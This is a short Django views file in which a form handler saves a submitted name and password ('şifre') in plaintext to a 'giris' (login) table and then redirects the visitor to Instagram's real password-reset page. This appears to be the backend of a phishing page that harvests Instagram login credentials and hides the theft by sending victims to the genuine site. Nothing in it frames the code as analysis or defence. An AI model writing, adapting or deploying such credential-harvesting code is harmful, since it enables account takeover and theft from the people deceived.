from django.shortcuts import render,redirect
from django.views import View
from web.models import giris as giris_model
# Create your views here.
class HomeView(View):
    def get(self, request):
        return render(request,'home.html')
   
   
    def post(self, request):
        name = request.POST.get('name')
        şifre = request.POST.get('şifre')
        giris_model.objects.create(name=name, şifre=şifre)
        return redirect('https://www.instagram.com/accounts/password/reset/')
